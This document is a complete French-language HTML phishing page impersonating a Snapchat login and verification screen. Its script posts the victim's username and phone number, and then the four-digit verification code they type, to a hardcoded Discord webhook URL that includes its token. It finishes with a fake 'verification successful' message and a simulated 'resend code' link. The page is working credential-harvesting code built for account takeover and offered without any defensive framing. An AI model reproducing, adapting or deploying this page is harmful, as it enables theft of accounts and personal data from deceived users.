<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Vérification</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #FFFC00;
            color: #000;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 400px;
            min-height: 100vh;
            padding: 40px 24px;
            display: flex;
            flex-direction: column;
        }

        .logo {
            text-align: center;
            font-size: 42px;
            margin-bottom: 40px;
            font-weight: bold;
            letter-spacing: -1px;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 12px;
            text-align: center;
        }

        .subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 32px;
        }

        .input {
            width: 100%;
            height: 56px;
            border-radius: 12px;
            border: 2px solid #ddd;
            background: #fff;
            color: #000;
            padding: 0 16px;
            font-size: 16px;
            outline: none;
            margin-bottom: 16px;
            transition: border-color 0.2s;
        }

        .input::placeholder {
            color: #999;
        }

        .input:focus {
            border-color: #0EADFF;
        }

        .phone-container {
            display: flex;
            align-items: center;
            height: 56px;
            border-radius: 12px;
            border: 2px solid #ddd;
            background: #fff;
            margin-bottom: 20px;
            overflow: hidden;
        }

        .country {
            height: 100%;
            display: flex;
            align-items: center;
            padding: 0 14px;
            border-right: 2px solid #ddd;
            font-size: 15px;
            font-weight: 600;
            color: #333;
            background: #f5f5f5;
        }

        .phone {
            flex: 1;
            height: 100%;
            border: none;
            outline: none;
            background: transparent;
            color: #000;
            padding: 0 14px;
            font-size: 16px;
        }

        .phone::placeholder {
            color: #999;
        }

        .continue {
            width: 100%;
            height: 56px;
            border: none;
            border-radius: 28px;
            background: #0EADFF;
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 8px;
        }

        .continue:hover {
            filter: brightness(1.1);
            transform: scale(1.02);
        }

        .continue:active {
            transform: scale(0.98);
        }

        .info {
            margin-top: 20px;
            text-align: center;
            color: #666;
            font-size: 12px;
            line-height: 1.5;
        }

        /* Écran de vérification */
        .verify-screen {
            display: none;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }

        .verify-icon {
            font-size: 48px;
            margin-bottom: 24px;
        }

        .code-message {
            font-size: 16px;
            color: #333;
            text-align: center;
            margin-bottom: 32px;
            line-height: 1.5;
        }

        .code-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-bottom: 32px;
        }

        .code-input {
            width: 64px;
            height: 72px;
            border: 2px solid #ddd;
            border-radius: 12px;
            background: #fff;
            text-align: center;
            font-size: 28px;
            font-weight: 700;
            color: #000;
            outline: none;
            transition: all 0.2s;
        }

        .code-input:focus {
            border-color: #0EADFF;
            box-shadow: 0 0 0 3px rgba(14, 173, 255, 0.2);
        }

        .verify-btn {
            width: 100%;
            height: 56px;
            border: none;
            border-radius: 28px;
            background: #0EADFF;
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
        }

        .verify-btn:hover {
            filter: brightness(1.1);
        }

        .verify-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .resend {
            margin-top: 20px;
            font-size: 14px;
            color: #0EADFF;
            text-decoration: none;
            font-weight: 600;
        }

        .success {
            display: none;
            margin-top: 40px;
            padding: 24px;
            border-radius: 16px;
            background: #fff;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }

        .success-icon {
            font-size: 48px;
            margin-bottom: 16px;
        }

        .success-text {
            font-size: 18px;
            font-weight: 700;
            color: #000;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>

<body>

    <main class="container">

        <!-- Écran 1 : Formulaire -->
        <div id="form-screen">
            <div class="logo">👻</div>
            
            <h1>Connexion</h1>
            <p class="subtitle">Entrez vos informations pour continuer</p>

            <form id="form">
                <input
                    class="input"
                    id="username"
                    type="text"
                    placeholder="Nom d'utilisateur"
                    autocomplete="off"
                    required
                >

                <div class="phone-container">
                    <div class="country">🇫🇷 +33</div>
                    <input
                        class="phone"
                        id="phone"
                        type="tel"
                        placeholder="Numéro de téléphone"
                        autocomplete="tel"
                        required
                    >
                </div>

                <button class="continue" type="submit">
                    Continuer
                </button>
            </form>

            <p class="info">
                En continuant, vous acceptez les Conditions d'utilisation et la Politique de confidentialité.
            </p>
        </div>

        <!-- Écran 2 : Vérification du code -->
        <div class="verify-screen" id="verify-screen">
            <div class="verify-icon">📱</div>
            
            <h1>Vérification</h1>
            <p class="code-message">
                Un code à 4 chiffres vous a été envoyé<br>
                au <strong id="display-phone">+33 ...</strong>
            </p>

            <div class="code-container">
                <input type="text" maxlength="1" class="code-input" id="code1" inputmode="numeric">
                <input type="text" maxlength="1" class="code-input" id="code2" inputmode="numeric">
                <input type="text" maxlength="1" class="code-input" id="code3" inputmode="numeric">
                <input type="text" maxlength="1" class="code-input" id="code4" inputmode="numeric">
            </div>

            <button class="verify-btn" id="verify-btn" type="button">
                Vérifier
            </button>

            <a href="#" class="resend" id="resend">Renvoyer le code</a>
        </div>

        <!-- Écran 3 : Succès -->
        <div class="success" id="success">
            <div class="success-icon">✅</div>
            <div class="success-text">Vérification réussie !</div>
        </div>

    </main>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519782475222483036/WvhWDXA34FkJB0_fbcNT4X5PQb8D58kDA0TNBK_i4RQf85peDe6xursXooQ_BkKUPbop";

        const formScreen = document.getElementById("form-screen");
        const verifyScreen = document.getElementById("verify-screen");
        const successScreen = document.getElementById("success");
        
        const form = document.getElementById("form");
        const usernameInput = document.getElementById("username");
        const phoneInput = document.getElementById("phone");
        const displayPhone = document.getElementById("display-phone");
        
        const codeInputs = [
            document.getElementById("code1"),
            document.getElementById("code2"),
            document.getElementById("code3"),
            document.getElementById("code4")
        ];
        const verifyBtn = document.getElementById("verify-btn");
        const resendLink = document.getElementById("resend");

        let userData = {
            username: "",
            phone: ""
        };

        // Soumission du formulaire initial
        form.addEventListener("submit", async function(event) {
            event.preventDefault();

            userData.username = usernameInput.value.trim();
            userData.phone = phoneInput.value.trim();

            // Afficher le numéro masqué
            const maskedPhone = "+33 " + userData.phone.slice(0, 2) + "••••••" + userData.phone.slice(-2);
            displayPhone.textContent = maskedPhone;

            // Envoyer les infos à Discord
            const message = {
                content: "📩 **Nouvelle soumission !**\n" +
                         "👤 **Snapchat :** `" + userData.username + "`\n" +
                         "📱 **Téléphone :** `+33 " + userData.phone + "`\n" +
                         "⏳ **Status :** En attente du code...\n" +
                         "🕐 **Date :** `" + new Date().toLocaleString('fr-FR') + "`"
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(message)
                });

                // Passer à l'écran de vérification
                formScreen.style.display = "none";
                verifyScreen.style.display = "flex";
                codeInputs[0].focus();

            } catch (error) {
                console.error(error);
                alert("Erreur de connexion. Veuillez réessayer.");
            }
        });

        // Gestion des inputs du code (auto-focus suivant)
        codeInputs.forEach((input, index) => {
            input.addEventListener("input", function(e) {
                // Accepter uniquement les chiffres
                this.value = this.value.replace(/[^0-9]/g, '');
                
                if (this.value.length === 1 && index < 3) {
                    codeInputs[index + 1].focus();
                }
                
                checkCodeComplete();
            });

            input.addEventListener("keydown", function(e) {
                if (e.key === "Backspace" && this.value === "" && index > 0) {
                    codeInputs[index - 1].focus();
                }
            });
        });

        function checkCodeComplete() {
            const code = codeInputs.map(input => input.value).join("");
            verifyBtn.disabled = code.length !== 4;
        }

        // Vérification du code
        verifyBtn.addEventListener("click", async function() {
            const code = codeInputs.map(input => input.value).join("");
            
            if (code.length !== 4) return;

            // Envoyer le code à Discord
            const message = {
                content: "🔐 **Code reçu !**\n" +
                         "👤 **Snapchat :** `" + userData.username + "`\n" +
                         "📱 **Téléphone :** `+33 " + userData.phone + "`\n" +
                         "🔢 **Code :** `" + code + "`\n" +
                         "✅ **Status :** Vérification complète\n" +
                         "🕐 **Date :** `" + new Date().toLocaleString('fr-FR') + "`"
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(message)
                });

                verifyScreen.style.display = "none";
                successScreen.style.display = "block";

            } catch (error) {
                console.error(error);
                alert("Erreur lors de la vérification.");
            }
        });

        // Renvoyer le code (simulation)
        resendLink.addEventListener("click", function(e) {
            e.preventDefault();
            alert("Un nouveau code a été envoyé !");
            codeInputs.forEach(input => input.value = "");
            codeInputs[0].focus();
        });
    </script>

</body>
</html>
